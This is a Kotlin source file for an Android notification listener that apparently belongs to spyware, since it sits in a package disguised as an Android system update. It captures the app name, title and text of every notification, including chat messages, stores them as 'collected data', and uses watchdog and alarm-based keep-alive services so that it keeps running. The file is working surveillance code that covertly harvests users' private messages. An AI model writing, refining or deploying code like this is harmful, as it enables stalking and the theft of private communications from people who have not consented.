package com.androidsystem.update.service

import android.content.Intent
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.androidsystem.update.database.DataRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap
import javax.inject.Inject

@AndroidEntryPoint
class NotificationListener : NotificationListenerService() {

    @Inject lateinit var repository: DataRepository

    // Single long-lived scope instead of a fresh CoroutineScope per notification
    // (the previous version created + cancelled one per event — fast leak under
    // bursty notification traffic, e.g. WhatsApp group chats).
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Per-package, per-key dedup window so the same notification is not
    // re-inserted if the system fires onNotificationPosted repeatedly for the
    // same sbn (some OEMs do this when a notif is updated or expanded).
    private val recentKeys = ConcurrentHashMap<String, Long>()
    private val DEDUP_WINDOW_MS = 2000L

    override fun onListenerConnected() {
        super.onListenerConnected()
        try {
            startService(Intent(this, CoreService::class.java))
            startService(Intent(this, WatchdogService::class.java))
        } catch (e: Exception) {
            Log.e("NotificationListener", "Keep-alive direct start blocked, using alarm", e)
            WatchdogService.scheduleAlarmStart(this, CoreService::class.java, 1000L)
            WatchdogService.scheduleAlarmStart(this, WatchdogService::class.java, 2000L)
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn ?: return
        val key = "${sbn.packageName}:${sbn.notification.extras.getString("android.title")}:${sbn.notification.extras.getCharSequence("android.text")}"
        val now = System.currentTimeMillis()
        val last = recentKeys[key]
        if (last != null && now - last < DEDUP_WINDOW_MS) return
        recentKeys[key] = now
        // GC old entries
        if (recentKeys.size > 256) {
            val cutoff = now - 60_000L
            recentKeys.entries.removeIf { it.value < cutoff }
        }
        scope.launch {
            try {
                repository.insertCollectedData("notification", JSONObject().apply {
                    put("package", sbn.packageName)
                    put("title", sbn.notification.extras.getString("android.title") ?: "")
                    put("text", sbn.notification.extras.getCharSequence("android.text")?.toString() ?: "")
                    put("timestamp", now)
                }.toString())
            } catch (e: Exception) {
                Log.e("NotificationListener", "insert failed", e)
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
